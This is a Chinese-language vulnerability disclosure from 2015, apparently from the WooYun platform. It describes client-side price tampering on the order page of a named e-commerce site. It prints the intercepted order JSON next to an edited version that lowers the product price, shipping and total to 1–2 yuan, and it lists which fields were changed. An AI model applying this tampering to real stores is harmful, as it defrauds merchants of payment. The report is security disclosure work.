wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-07-28：	细节已通知厂商并且等待厂商处理中									2015-08-02：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： money 详细说明：  问题网站
http://weiluyi.m.ciwong.com
直接下订单，在确定订单时抓包，会见到一个json，解下
{"PlatformAccount":0,"RecipientName":"小黑","Address":"11,1100|北京市,市直属","StreetAddress":"北京市+市直属+绿野仙踪","ZipCode":"457000","Email":"111@11.com","Mobile":"15236087453","Phone":"","CommodityPrice":298,"Freight":15,"ShippingInstructions":"","OrderAmount":313,"TotalWeight":2,"FeedBack":"","IsInvoicing":0,"InvoicingName":"","InvoicingContent":"","payStatus":3,"orderStatus":3,"Payment":0,"ModifyUserId":0,"ModifyUserName":"","ModifyRemark":"","OrderDetails":[{"OrderId":0,"GoodsId":"1","GoodsName":"微录仪微课视频录制工具","Price":"298","Numble":"1","TotalMoney":"298"}]}
ok，改下数据重新编码，替换原来json即可修改后的json
{"PlatformAccount":0,"RecipientName":"小黑","Address":"11,1100|北京市,市直属","StreetAddress":"北京市+市直属+绿野仙踪","ZipCode":"457000","Email":"111@11.com","Mobile":"15236087453","Phone":"","CommodityPrice":1,"Freight":1,"ShippingInstructions":"","OrderAmount":2,"TotalWeight":2,"FeedBack":"","IsInvoicing":0,"InvoicingName":"","InvoicingContent":"","payStatus":3,"orderStatus":3,"Payment":0,"ModifyUserId":0,"ModifyUserName":"","ModifyRemark":"","OrderDetails":[{"OrderId":0,"GoodsId":"1","GoodsName":"微录仪微课视频录制工具","Price":"1","Numble":"1","TotalMoney":"1"}]}
这里主要修改了CommodityPrice, Freight(运费)，OrderAmount(总费用)，Price，TotalMoneyok
